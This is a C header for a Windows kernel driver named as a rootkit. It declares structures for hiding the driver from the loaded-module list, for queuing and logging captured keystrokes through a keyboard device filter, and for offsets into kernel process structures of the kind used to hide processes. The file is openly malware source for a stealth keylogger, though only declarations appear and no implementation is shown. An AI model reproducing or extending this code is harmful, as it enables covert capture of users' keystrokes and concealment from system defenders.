#ifndef _ROOTKIT_H_
#define _ROOTKIT_H_

#define		ROOTKIT_DRIVER_WIN32_DEV_NAME		L"\\DosDevices\\myRootkitDrv"
#define		ROOTKIT_DRIVER_DEV_NAME				L"\\Device\\myRootkitDrv"

// needed to hide module
typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	ULONG  unknown[4];
	ULONG  base;
	ULONG  driver_start;
	ULONG  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
	//...
} MODULE_ENTRY, *PMODULE_ENTRY;

PMODULE_ENTRY gul_PsLoadedModuleList;  // We are going to set this to point to PsLoadedModuleList.


typedef struct
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
} KEY_DATA;

//typedef struct
//{
//	BOOLEAN kSHIFT; //if the shift key is pressed 
//	BOOLEAN kCAPSLOCK; //if the caps lock key is pressed down
//	BOOLEAN kCTRL; //if the control key is pressed down
//	BOOLEAN kALT; //if the alt key is pressed down
//}KEY_STATE ;

typedef struct {
	PVOID pointer;	//usefull thing, reserved ;)
//	KEY_STATE kState;
	HANDLE hLogFile;				// 
	KSEMAPHORE semaphore;			// sync mechanism
	KSPIN_LOCK spinlock;			// sync mechanism
	LIST_ENTRY listHead;			// queue to hold not processed keys
	BOOLEAN bThreadRunning;			// should thread be running ?
	PETHREAD pThread;				// our worker thread

	PDEVICE_OBJECT PrevDevice;		//we keep last keyboard device
} ROOTKIT_EXT, *PROOTKIT_EXT;

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath);
NTSTATUS CompleteRequest(PIRP Irp);
NTSTATUS CompleteKeyboard(IN PIRP Irp);
BOOLEAN SetupOffsets();

typedef struct {
	ULONG	nameOffset;
	ULONG	pidOffset;
	ULONG	flinkOffset;
	ULONG	handleTableOffset;
	ULONG	handleListOffset;
	ULONG	listEntryOffset;
	ULONG	handleTablePidOffset;
	ULONG	activeProcessListOffset;
	ULONG	eprocOffsetFromHandleTable;
	//more to come...
} ROOTKIT_SETUP_DATA, *PROOTKIT_SETUP_DATA;

#endif
